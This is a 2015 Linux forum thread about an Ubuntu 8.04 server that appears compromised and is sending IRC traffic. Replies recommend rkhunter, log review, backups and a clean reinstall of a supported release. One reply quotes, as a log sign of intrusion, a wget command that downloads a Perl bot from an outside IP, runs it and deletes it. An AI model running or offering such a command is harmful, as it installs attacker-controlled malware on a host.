---
title: "Outbound IRC traffic caused by suspected virus?"
date: 2015-06-12
forum: Security
---

### Post by gwei on 2015-06-12
We are running a server under Ubuntu 8.04.4 LTS. It's detected to periodically send outbound IRC traffic to 2 IP addresses in Amsterdam. The addresses are reported by some website associated to hacker or virus. Now the server was taken off by network security administrator. So, it's likely got affected by worm?
Could anyone offer some helps: 1) Is this really got infected by virus? 
2) How to check all the activities in last weeks, especially related to IRC traffic?
 3) Since this is an old version of Ubuntu, which antivirus program could be used or how get rid of the troubles?
Thank you.

---

### Post by Lars Noodén on 2015-06-12
> **gwei said:**
> 3) Since this is an old version of Ubuntu, which antivirus program could be used or how get rid of the troubles?[/FONT][/COLOR]
[COLOR=#111111][FONT=Ubuntu]Thank you.[/FONT][/COLOR]

The only supported way is to upgrade to 12.04 LTS or 14.04 LTS, the latter being good through the beginning of 2019.  If in fact your server was compromised then you do need to make a fresh installation.

---

### Post by QIII on 2015-06-12
Malware or system compromise are certainly possible.  A "virus" as it applies to Windows is foreign to Linux, although there are proofs of concept for things that behave very similarly.

In any case, running an 8.04 server was inviting disaster.  There is little point in trying to straighten it out, as you'll not be able to rectify any security vulnerabilities in it.  The best thing to do would be to recover any mission critical files and install a currently supported LTS release, as suggested above.  I'd recommend 14.04, since it is supported until April 2019.

---

### Post by Habitual on 2015-06-12
look for chmod in the apache log files.
It is a sure sign that something is amiss.
Crud that resembles ```
wget -O /tmp/perlbot.pl 74.201.85.69/perlbot.pl;chmod +x /tmp/perlbot.pl; /tmp/perlbot.pl;rm -rf /tmp/perlbot.pl
```
Red flags are a single host using > 2, I think is a fair bet. 
But I'm just as aggressive as they are!

Install rkhunter and run it:
```
cd /usr/src && wget [http://hivelocity.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.2/rkhunter-1.4.2.tar.gz](http://hivelocity.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.2/rkhunter-1.4.2.tar.gz)
tar zxf rkhunter-1.4.2.tar.gz && cd rkhunter-1.4.2
./installer.sh --install
rkhunter --update &&  rkhunter -c -sk && less /var/log/rkhunter.log

```There is likely to be some false positives (usually about "hidden" stuff in .dev) and a couple more, but don't freak out.
Well, maybe just a little. Examine /var/log/rkhunter.log with some scrutiny.

This situation just may force you to "get current".

---

### Post by gwei on 2015-06-12
Thanks! But the problem is that this server has been taken off from the internet by administrator. So, I think I have to use the way "offline upgrade". Could you guys check the methods described in link below fessible? 
[http://itsfoss.com/upgrade-or-update-ubuntu-offline-without-internet/](http://itsfoss.com/upgrade-or-update-ubuntu-offline-without-internet/)

And, if I upgrade, can all the documents stored in the server and all the programs installed remain without any loss? 

Thank you.

---

### Post by CharlesA on 2015-06-12
> **gwei said:**
> Thanks! But the problem is that this server has been taken off from the internet by administrator. So, I think I have to use the way "offline upgrade". Could you guys check the methods described in link below fessible? 
[http://itsfoss.com/upgrade-or-update-ubuntu-offline-without-internet/](http://itsfoss.com/upgrade-or-update-ubuntu-offline-without-internet/)

And, if I upgrade, can all the documents stored in the server and all the programs installed remain without any loss? 

Thank you.

I would definitely make a backup of any data and do a clean install of 14.04. Upgrades might work out ok, but if the system has been in the wild for a while and has been running 8.04 (which was EoL on May 9, 2013). This means it hasn't had any security updates in over 2 years, which could be an issue if you still want it in production.

Clean install after verifying all your applications and data will work on 14.04 is the best way to handle this imo.

---

### Post by bashiergui on 2015-06-12
> **gwei said:**
> We are running a server under Ubuntu 8.04.4 LTS. It's detected to periodically send outbound IRC traffic to 2 IP addresses in Amsterdam. The addresses are reported by some website associated to hacker or virus. Now the server was taken off by network security administrator. So, it's likely got affected by worm?No, someone just exploited one of many vulnerabilities and now they've probably got root.
> Could anyone offer some helps: 1) Is this really got infected by virus?  It's not a worm or a virus. A server running 8.04 has dozens of serious vulnerabilities that could be exploited remotely. 
> 2) How to check all the activities in last weeks, especially related to IRC traffic?Look at firewall logs and packet captures. You can also look through all your logs on the server itself.
> 3) Since this is an old version of Ubuntu, which antivirus program could be used or how get rid of the troubles?
Thank you.Anti-virus would never stop this problem. Only way to get rid of troubles is to get a fully patched and upgraded server running fully patched and upgraded apps. 

Is this server remote or in the cloud?

---

### Post by bashiergui on 2015-06-12
> **gwei said:**
> And, if I upgrade, can all the documents stored in the server and all the programs installed remain without any loss? Documents might be ok, but I would want to verify they're legit. Programs- no way. Unless you're confident in your forensic skills or you can verify the hash of every program, I would assume the attacker has compromised every application. It would be expected that the attacker has installed some of his own apps as well as replaced some of yours with compromised ones.

---

### Post by CharlesA on 2015-06-12
> **bashiergui said:**
> Documents might be ok, but I would want to verify they're legit. Programs- no way. Unless you're confident in your forensic skills or you can verify the hash of every program, I would assume the attacker has compromised every application. It would be expected that the attacker has installed some of his own apps as well as replaced some of yours with compromised ones.

Agreed. I'm not even sure what the server is actually supposed to be running, but I wouldn't even trust anything on it since it has been End of Life for so long.

Even something as simple as a forum or wiki likely hasn't been updated and even if it's just hosting a simple website coded in HTML, anyone who gained root access could have modified any of the files to do nasty things.

---

### Post by Habitual on 2015-06-13
> **gwei said:**
> Thanks! But the problem is that this server has been taken off from the internet by administrator. So, I think I have to use the way "offline upgrade". Could you guys check the methods described in link below fessible? 
[http://itsfoss.com/upgrade-or-update-ubuntu-offline-without-internet/](http://itsfoss.com/upgrade-or-update-ubuntu-offline-without-internet/)

Thank you.Can one "upgrade" from an EOL product? Sort of doubt it.

Ask the admin to setup a new host with access to the internet and rebuild that host with a current (LTS!) release.
** This 8.04 host is  toast.**

> **CharlesA said:**
> I wouldn't even trust anything on it since it has been End of Life for so long.
and I agree.

---

